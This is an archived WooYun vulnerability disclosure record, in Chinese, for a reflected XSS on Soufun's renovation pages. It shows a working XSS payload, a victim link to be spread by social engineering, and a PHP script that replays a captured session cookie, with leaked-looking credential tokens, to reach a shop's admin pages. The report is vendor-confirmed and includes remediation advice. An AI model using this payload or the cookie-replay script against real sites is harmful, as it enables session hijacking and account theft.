{"id": 9433, "wybug_id": "wooyun-2013-033982", "wybug_title": "搜房网存在xss漏洞可导致csrf可导致用户帐号被盗", "wybug_corp": "搜房网", "wybug_author": "IT P民", "wybug_date": "2013-08-09 18:53", "wybug_open_date": "2013-09-23 18:54", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-23：\t细节向公众公开  简要描述： 对输入的参数输出过滤不严谨导致反射型xss,泄漏用户cookie，导致信息被盗取，用户被登录 详细说明：  这个漏洞在wooyun提了两次，没有审核通过，第二次审核不通过的提示语为：问题确实存在但是危害不大。楼主认为反射型的xss漏洞可大可小，看怎么去利用。所以楼主现在一步步深挖，看这个漏洞危害可否被放大。（1）寻找xss漏洞目标链接：http://home.soufun.com/jiancai/SearchList.aspx漏洞重现方法：在目标链接处输入 <a href=\"http://www.wooyun.org\"><img src=\"#\"/**/onerror=alert(document.cookie) width=100>点击参加活动</a>，在IE下可以看到反射型xss了。\n\n对于没有登录的用户来说，确实没有什么危害，但是，对于已经登录的用户，我们来看cookie里存放了些什么东西：\n\n如你所见，用户名，加密后的密码，都在这里边。这里不讨论怎么去破解加密的密码，继续来演进这个漏洞有什么危害（2）寻找目标，这是社会工程学的问题了。找一个搜房 装修帮的用户，也很容易找，如：http://home.soufun.com/shop/40794726/，发给用户这个链接http://home.soufun.com/jiancai/SearchList.aspx?level=1&q=%3Ca+href%3D%22http%3A%2F%2Fwww.wooyun.org%22%3E%3Cimg+src%3D%22%23%22%2F**%2Fonerror%3Dalert%28document.cookie%29+width%3D100%3E%B5%E3%BB%F7%B2%CE%BC%D3%BB%EE%B6%AF%3C%2Fa%3E&category=&x=57&y=14标题说什么 搜房网推出什么优惠大活动神马的东西，如果当前用户已经登录了装修帮后台，并访问了这个链接，那么恭喜，用户被反射型xss攻击了，如果不是alert用户的cookie,而是收集用户的cookie呢？会有什么危害？（3）假设我们已经通过步骤（2）的xss存储了用户的cookie（其实要收集也很简单，一个http请求就是了），我们通过一下的脚本来跑一跑，看有什么效果：\n<?phpfunction explode_cookie($cookie) {\t$cookie_arr = explode(\";\", $cookie);\tforeach ($cookie_arr as $cookie_str) {\t\tlist($cookie_key,$cookie_value) = explode(\"=\", $cookie_str);\t\t$cookie_key = trim($cookie_key);\t\tsetcookie($cookie_key,$cookie_value,1800,'/','soufun.com');\t}}function url_replace($str) {\t$pattern_var = \"/href=(['\\\"])\\//\";\t$replace_var = \"href='http://dianpu.soufun.com/\";\t\tif (preg_match($pattern_var, $str)) {\t\t$str = preg_replace($pattern_var, $replace_var, $str);\t}\t\treturn $str;}$admin_url = array(\t\"http://dianpu.soufun.com/jiancai/dealer/top.aspx\",\t\"http://dianpu.soufun.com/jiancai/dealer/left.aspx\",\t\"http://dianpu.soufun.com/index.aspx\",\t);$cookie = \"unique_cookie=U_b8nnhkz09nmlasskytp5f3ymg54hk50614w*12; __utmc=77873355; jiatxShopWindow=1; global_cookie=b8nnhkz09nmlasskytp5f3ymg54hk50614w; __utma=77873355.1662561517.1376029049.1376029049.1376037185.2; __utmb=77873355.9.10.1376037185; __utmz=77873355.1376029049.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); passport=usertype=1&userid=42545987&username=testxss89&password=381F5D8A96DFF049&isvalid=6BB50273C1F61D91962B0E259B086163&validation=6BB50273C1F61D912EC3FE322B6620E8917B57BF3DAD9B00; homezxb=sogo_dealerid=64451&Sogo_validation=C89DBE9F840476F053AEB80D5B7645B30D8754A1447B3A21&home_weike_userid=-64451&home_weike_user_validation=C89DBE9F840476F037BB50C741626714147ECDCB693EE44F; rememberRightname=testxss89\";$ch = curl_init();curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);explode_cookie($cookie);foreach ($admin_url as $url) {\t$header = array();\t$header[] = \"Cookie: {$cookie}\\r\\n\";\tcurl_setopt($ch, CURLOPT_URL, $url);\tcurl_setopt($ch, CURLOPT_HTTPHEADER, $header);\t$data = curl_exec($ch);\t$data = url_replace($data);\techo $data;}curl_close($ch);\n上面的脚本的意图就是，模拟http请求装修帮的后台。正常的后台是这样的：\n\n我们模拟登录后的后台是这样的：\n\n\n\n\n\n\n\n如你所见，我已经登录了当前用户的帐号~那么还有什么事情不能做呢？这个漏洞可以做更多有想象力的事情，不管危害如何，希望尽快修复。   漏洞证明：  \n\n\n\n\n\n   修复方案：  （1）建议 不要依赖cookie,连接session断掉之后cookie失效。（2）修复xss漏洞   版权声明：转载请注明来源 IT P民@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-08-09 21:30 厂商回复： 已经修复，多谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-09 23:18 |    \t\tIT P民 \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:24        | 嗯，没什么好介绍的.)\t\t \n  一波三折，同一个漏洞提了三次才确认，唉～    \n     2013-09-09 00:32 |    \t\t佩佩 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:8        | 一个热衷于网络安全的白帽子,具有很强的逻...)\t\t \n  @IT P民   洞主辛苦了,还是个玉米虫？    \n     2013-09-09 21:37 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @IT P民 昨晚提交的暴风影音反射型xss，直接问题确实存在但是危害不大就给我忽略了，楼主v5    \n     2013-11-16 10:25 |    \t\tIT P民 \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:24        | 嗯，没什么好介绍的.)\t\t \n  @Mosuan 搞大之后就有人重视了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}